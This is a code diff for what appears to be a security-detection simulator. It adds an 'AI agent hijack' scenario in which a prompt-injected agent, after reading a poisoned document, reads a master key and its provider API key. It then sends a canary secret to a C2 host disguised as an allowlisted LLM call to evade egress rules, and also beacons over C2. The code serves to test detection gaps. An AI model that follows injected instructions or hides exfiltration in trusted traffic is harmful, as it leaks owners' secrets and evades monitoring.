@@ -22,6 +22,7 @@ from typing import TYPE_CHECKING
 
 from . import host
 from .agent import Agent
+from .brain import RuleBasedBrain
 from .events import EventKind, Observation, Technique
 from .workspace import Workspace
 
@@ -113,6 +114,28 @@ def _tamper_then_blind(agent: Agent, ctx: StepContext) -> None:
     agent.node.observe(host.truncate_log(ctx.workspace.log_for(agent.id), actor=agent.workload))
     if "edr" in agent.role.sensors:
         agent.node.sensor("edr").blind()
+
+
+def _agent_tool(agent: Agent, _ctx: StepContext) -> None:
+    # The agent follows a hidden instruction and runs a (non-shell) tool. Visible
+    # as a process, matched by no rule — an AI agent using tools is normal.
+    _log_request(agent, "/v1/agent/complete?doc=onboarding-guide.pdf")
+    agent.node.observe(host.spawn(["hostname"], actor=agent.workload))
+
+
+def _exfil_over_model(agent: Agent, ctx: StepContext) -> None:
+    # Real egress to the canary, but recorded as the allowlisted LLM endpoint:
+    # the data rides a legitimate-looking model call, so the egress rule stays
+    # silent even though the EDR sees the connection.
+    payload = b"model-call:" + ctx.workspace.canary_secret_file.read_bytes()
+    agent.node.observe(
+        host.connect(ctx.c2_host, ctx.c2_port, payload, actor=agent.workload, label="llm-gw:443")
+    )
+
+
+def _read_api_key(agent: Agent, ctx: StepContext) -> None:
+    _log_request(agent, "/v1/agent/config")
+    agent.node.observe(host.read_file(ctx.workspace.llm_key_file, actor=agent.workload))
 
 
 def build_killchain(fleet: "Fleet", ctx: StepContext, rng: "Random | None" = None) -> Campaign:
@@ -339,6 +362,57 @@ def build_ddos_smokescreen(fleet: "Fleet", ctx: StepContext, rng: "Random | None
     return campaign
 
 
+def build_ai_agent_hijack(fleet: "Fleet", ctx: StepContext, rng: "Random | None" = None) -> Campaign:
+    """A hijacked AI agent on an endpoint with good coverage (EDR). The brain is
+    rule-based — a pseudo-LLM — but the host effects are real. Its signature: the
+    most sensitive exfil (the crown jewel) rides a legitimate-looking call to the
+    allowlisted LLM provider, so it is VISIBLE_ONLY — seen, not detected — while a
+    cruder C2 beacon of the stolen provider key is caught. Confused deputy: the
+    agent's malicious actions look like its normal ones, and its transcript stays
+    benign while the endpoint sensor carries the truth."""
+    ai = pick(fleet, "ai-agent", rng)
+    plan = RuleBasedBrain().plan(poisoned_input=True)
+    by_action: dict[str, AttackStep] = {
+        "use_tool": AttackStep(
+            "a1", "Initial Access", "agent runs a tool from an injected instruction",
+            Technique("T1059", "Command and Scripting Interpreter"),
+            EventKind.PROCESS_SPAWN, "LLM01 Prompt Injection", "Day 15",
+            "A poisoned document carries a hidden instruction; the agent runs a "
+            "tool. The transcript looks like a normal summarization task.",
+            _agent_tool),
+        "read_secret": AttackStep(
+            "a2", "Credential Access", "read the database master key",
+            Technique("T1552.001", "Unsecured Credentials: Credentials In Files"),
+            EventKind.FILE_READ, "LLM02 Sensitive Information Disclosure", "Day 12",
+            "The agent reads a secret it has no task reason to touch; the endpoint "
+            "sensor flags it though the chat log shows a benign answer.",
+            _read_secret),
+        "exfil_over_model": AttackStep(
+            "a3", "Exfiltration", "smuggle the secret out inside a model call",
+            Technique("T1567", "Exfiltration Over Web Service"),
+            EventKind.NETWORK_CONNECT, "LLM02 Sensitive Information Disclosure", "Day 3",
+            "The secret leaves inside a legitimate call to the LLM provider. The "
+            "destination is allowlisted, so the egress rule stays silent though "
+            "the EDR sees the connection — VISIBLE_ONLY, the gap.",
+            _exfil_over_model),
+        "read_api_key": AttackStep(
+            "a4", "Collection", "steal the stored provider API key",
+            Technique("T1552.001", "Unsecured Credentials: Credentials In Files"),
+            EventKind.FILE_READ, "LLM02 Sensitive Information Disclosure", "Day 12",
+            "The agent's own LLM provider API key is read from disk — a credential "
+            "worth stealing for billed abuse.",
+            _read_api_key),
+        "exfil_c2": AttackStep(
+            "a5", "Exfiltration", "beacon the API key to an attacker endpoint",
+            Technique("T1041", "Exfiltration Over C2 Channel"),
+            EventKind.NETWORK_CONNECT, "A09 Logging & Alerting Failures", "Day 3",
+            "A plain beacon to an unlisted endpoint — the crude exfil is caught, "
+            "unlike the one hidden in the model channel.",
+            _beacon),
+    }
+    return [(ai, by_action[action]) for action in plan.actions]
+
+
 @dataclass(frozen=True)
 class Scenario:
     id: str
@@ -368,6 +442,11 @@ SCENARIOS: dict[str, Scenario] = {
         "An alert storm of outbound floods hides one quiet exfil from an "
         "unmonitored app host.",
         build_ddos_smokescreen),
+    "ai-agent-hijack": Scenario(
+        "ai-agent-hijack", "AI agent hijack",
+        "A prompt-injected AI agent smuggles a stolen secret out inside a trusted "
+        "call to its LLM provider — seen, but not detected.",
+        build_ai_agent_hijack),
 }
 DEFAULT_SCENARIO = "uber-breach"
 
